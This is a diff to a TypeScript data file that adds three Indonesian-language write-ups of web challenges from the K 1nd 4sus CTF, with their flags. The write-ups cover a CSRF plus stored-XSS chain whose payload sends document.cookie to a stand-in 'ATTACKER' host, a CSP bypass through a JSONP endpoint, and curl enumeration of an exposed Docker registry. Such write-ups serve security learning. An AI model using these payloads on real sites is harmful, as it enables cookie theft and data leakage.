@@ -1,6 +1,5 @@
-import type { WriteUp } from '../types';
+import type { WriteUp } from "../types";
 
-// K 1nd 4sus — 8 writeups
 export const k1nd4susCtfWriteups: WriteUp[] = [
   {
     "id": "k1nd4sus-pwn-itsgoodbebackontheair",
@@ -388,6 +387,110 @@ export const k1nd4susCtfWriteups: WriteUp[] = [
     ],
     "terminalOutputs": [],
     "flag": "KSUS{4b4eba6646f7903fd437d6fbf1b5783d}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "k1nd4sus-web-ezbounty",
+    "title": "Writeup - Ez Bounty",
+    "category": "Web",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-08-16",
+    "author": "Nattt",
+    "ctfName": "K 1nd 4sus",
+    "tags": [],
+    "description": "Challenge: **Ez Bounty**  \nKategori: **Web**",
+    "problemDescription": "Aplikasi punya dua isu yang bisa dirangkai:\n\n1. **CSRF di `/logout` dan `/login`**\n- Tidak ada token CSRF.\n- Cookie session diset dengan `SameSite=None`, jadi request cross-site tetap membawa cookie.\n- `/logout` pakai GET, jadi bisa dipicu lewat `<img src=...>`.\n\n2. **Stored XSS di dashboard**\n- Username dirender dengan `{{ username | safe }}` di `templates/dashboard.html`.\n- Artinya HTML/JS dari username dieksekusi saat halaman dashboard dibuka.",
+    "tools": [],
+    "analysis": "Di `app.py`:\n- Bot login sebagai admin.\n- Setelah login, bot set cookie `flag` (`httpOnly=False`, `sameSite=None`, `secure=True`).\n- Lalu bot membuka URL yang kita submit ke `/report`.\n\nKarena cookie `flag` tidak HttpOnly, JavaScript bisa baca `document.cookie`.",
+    "solution": [
+      {
+        "title": "Rantai Eksploitasi",
+        "content": "1. Buat akun dengan username berisi XSS:\n```html\n<script>new Image().src='https://ATTACKER/x?c='+encodeURIComponent(document.cookie)</script>\n```\n\n2. Host halaman `exploit.html` di domain publik attacker. Isinya:\n- Trigger `GET /logout` (biar admin logout).\n- Auto-submit form POST ke `/login` dengan credential akun XSS tadi.\n\n3. Submit URL `exploit.html` ke `/report`.\n\n4. Bot admin membuka halaman attacker:\n- session admin logout,\n- login sebagai akun XSS,\n- redirect ke `/dashboard`,\n- XSS jalan dan kirim `document.cookie` ke endpoint attacker.\n\n5. Dari callback, ambil nilai cookie `flag`."
+      },
+      {
+        "title": "Solver",
+        "content": "File solver: `solver.py`\n\nScript ini mengotomasi:\n- pendaftaran user payload XSS,\n- pendaftaran user pelapor,\n- submit report,\n- serve `/exploit.html` dan endpoint `/x` lokal,\n- parsing flag dari callback.\n\n### Cara pakai\n1. Aktifkan venv:\n```bash\nsource /home/nata/ctf_env/bin/activate\n```\n\n2. Jalankan tunnel ke port lokal 8000 (contoh ngrok):\n```bash\nngrok http 8000\n```\n\n3. Ambil URL publik ngrok, lalu jalankan solver:\n```bash\npython3 solver.py --public-url https://YOUR-NGROK-DOMAIN\n```\n\n4. Jika berhasil, output berisi:\n```text\n<FLAG>...</FLAG>\n```"
+      },
+      {
+        "title": "Catatan Teknis",
+        "content": "- Challenge minta Chromium-based karena bot memakai Chrome headless (`pyppeteer` + `google-chrome-stable`).\n- Beberapa skema URL seperti `javascript:`/`data:` tidak selalu reliable di konteks ini, jadi chain paling stabil adalah halaman attacker publik + CSRF login + stored XSS."
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "KSUS{moneyless_iframe_baby}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "k1nd4sus-web-layeredcakeshop",
+    "title": "Layered Cake Shop Writeup",
+    "category": "Web",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-08-16",
+    "author": "Nattt",
+    "ctfName": "K 1nd 4sus",
+    "tags": [],
+    "description": "Writeup for challenge Layered Cake Shop Writeup",
+    "problemDescription": "- `GET /api/orders/<orderId>` bisa diakses tanpa auth dan membocorkan field `debug` untuk order gagal.\n- Field `debug.buildLog` membocorkan build image ID internal: `cake-2026-04-3e57c0`.\n- `GET /api/cakes/<name>/preview` pada value tertentu memicu error 500 yang mengungkap header internal:\n  - `X-Service: image-builder`\n  - `X-Upstream-Url: https://supersecureregistry.k1nd4sus.it/v2/`\n- Docker Registry internal bisa diakses publik (`/v2/_catalog`, `/tags/list`, `/manifests`, `/blobs`).\n- Layer image menyimpan file sensitif (`/app/secret_recipe.txt`) di layer tengah walaupun dihapus di layer akhir (masih bisa diekstrak dari blob layer).",
+    "tools": [],
+    "analysis": "",
+    "solution": [
+      {
+        "title": "Challenge",
+        "content": "- Name: `Layered Cake Shop`\n- Prompt: *I would really love to make Cannavaiolo's cake at home! Could you find the secret ingredients for me?*\n- Target: `http://chall.k1nd4sus.it:30509`"
+      },
+      {
+        "title": "Langkah Eksploit (Manual)",
+        "content": "1. Ambil order gagal awal:\n```bash\ncurl -s http://chall.k1nd4sus.it:30509/api/orders/ORD-2026-04-0001 | jq .\n```\nOutput penting:\n- `customer: \"cannavaiolo\"`\n- `debug.buildLog: \"failed to build image cake-2026-04-3e57c0 ...\"`\n\n2. Trigger preview pakai `build id` untuk leak upstream:\n```bash\ncurl -i -s http://chall.k1nd4sus.it:30509/api/cakes/cake-2026-04-3e57c0/preview\n```\nHeader penting:\n- `X-Upstream-Url: https://supersecureregistry.k1nd4sus.it/v2/`\n\n3. Enumerasi registry:\n```bash\ncurl -s https://supersecureregistry.k1nd4sus.it/v2/_catalog | jq .\ncurl -s https://supersecureregistry.k1nd4sus.it/v2/cakes/cannavaiolo/tags/list | jq .\n```\nTag penting:\n- `cake-2026-04-3e57c0-prod`\n\n4. Ambil manifest OCI:\n```bash\ncurl -s \\\n  -H 'Accept: application/vnd.oci.image.manifest.v1+json, application/vnd.oci.image.index.v1+json, application/vnd.docker.distribution.manifest.v2+json' \\\n  https://supersecureregistry.k1nd4sus.it/v2/cakes/cannavaiolo/manifests/cake-2026-04-3e57c0-prod | jq .\n```\n\n5. Download layer blob lalu cari flag/secret:\n```bash\ncurl -s https://supersecureregistry.k1nd4sus.it/v2/cakes/cannavaiolo/blobs/<layer-digest> -o layer.gz\ngzip -dc layer.gz | strings | grep -E 'KSUS\\{.*\\}'\n```"
+      },
+      {
+        "title": "Solver Otomatis",
+        "content": "Gunakan script:\n```bash\npython3 solver.py\n```\nScript melakukan:\n- Pivot dari order gagal\n- Leak upstream registry dari header preview error\n- Resolve repo+tag berdasarkan customer + build id\n- Pull manifest OCI dan semua layer\n- Regex `KSUS{...}` dari blob layer"
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "KSUS{Th1s_C4k3_T4sT3s_L1k3_a_Sl4P}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "k1nd4sus-web-sportivibe2",
+    "title": "SpotiVibe 2 - Writeup (Web Misc)",
+    "category": "Web",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-08-16",
+    "author": "Nattt",
+    "ctfName": "K 1nd 4sus",
+    "tags": [],
+    "description": "Writeup for challenge SpotiVibe 2 - Writeup (Web Misc)",
+    "problemDescription": "Challenge ini kelihatan seperti patch dari SpotiVibe 1, tapi masih bisa di-chain lewat 3 bug:\n\n1. **XSS di dashboard**\n   - Di `dashboard.html` ada `{{ search | safe }}`.\n   - Artinya input `search` dirender tanpa escaping.\n\n2. **CSP bypass lewat whitelisted domain**\n   - CSP dashboard hanya mengizinkan script dari `self` + `https://www.w3schools.com` + nonce.\n   - Tapi ada endpoint JSONP yang masih aktif:\n     - `https://www.w3schools.com/js/demo_jsonp2.php?callback=...`\n   - Ini memungkinkan eksekusi JS attacker tanpa nonce.\n\n3. **URL parser mismatch di validasi spotify_url**\n   - Server validasi `spotify_url` dengan:\n     - `decoded = unquote(url)`\n     - `urlparse(decoded)`\n     - host harus `open.spotify.com`\n     - path harus `/embed/...`\n   - Payload pakai `%68%74%74%70://...` (`http://` dalam bentuk encoded).\n   - Server melakukan `unquote` dulu, jadi menganggap ini URL valid ke Spotify.\n   - Browser **tidak** decode bagian encoded itu sebagai scheme saat set `iframe src`, jadi dianggap path relatif di origin challenge.",
+    "tools": [],
+    "analysis": "",
+    "solution": [
+      {
+        "title": "Informasi Challenge",
+        "content": "- Nama: SpotiVibe 2\n- Kategori: Web Misc\n- Target: `http://chall.k1nd4sus.it:30503`"
+      },
+      {
+        "title": "Intuisi Exploit",
+        "content": "Tujuan kita: memaksa bot admin (yang visit `/song/<id>`) agar iframe malah membuka:\n\n`/dashboard?search=<xss_payload>`\n\nBiar XSS jalan di konteks admin, baca `document.cookie` (yang berisi `flag=KSUS{...}`), lalu simpan hasil ke akun attacker sendiri via `POST /add_song`.\n\nTrik URL yang dipakai:\n\n`%68%74%74%70://open.spotify.com/embed/../../../../../dashboard?search=<payload>`\n\nKenapa `../../../../../`?\n- Karena iframe dimuat dari halaman `/song/<id>`.\n- Dengan traversal yang cukup, path akhirnya normalisasi ke `/dashboard`."
+      },
+      {
+        "title": "Langkah Exploit",
+        "content": "1. Register + login akun attacker.\n2. Tambah lagu berisi `spotify_url` payload di atas.\n3. `search` diisi `<script src='https://www.w3schools.com/js/demo_jsonp2.php?callback=...'></script>`.\n4. Report song id ke bot admin.\n5. Saat bot buka `/song/<id>`:\n   - iframe resolve ke `/dashboard?search=...`\n   - XSS jalan (via JSONP W3Schools)\n   - JS payload melakukan:\n     - `fetch('/logout')`\n     - login ulang sebagai attacker\n     - `POST /add_song` dengan `title=document.cookie`\n6. Poll `/dashboard` attacker sampai `KSUS{...}` muncul di judul lagu."
+      },
+      {
+        "title": "Solver",
+        "content": "File: `solver.py`\n\nJalankan:\n\n```bash\nsource /home/nata/ctf_env/bin/activate\npython3 solver.py\n```\n\nOutput sukses:\n\n```text\n<FLAG>KSUS{...}</FLAG>\n```"
+      },
+      {
+        "title": "Catatan Praktis",
+        "content": "- Kadang bot antre, jadi kalau belum dapat di percobaan pertama, jalankan lagi.\n- Solver yang dipakai di sini adalah versi direct final chain (tanpa brute-force kandidat URL banyak)."
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "KSUS{61592b2c5b7175ebe1da5f799285a3b3}",
     "lessonsLearned": ""
   }
 ];
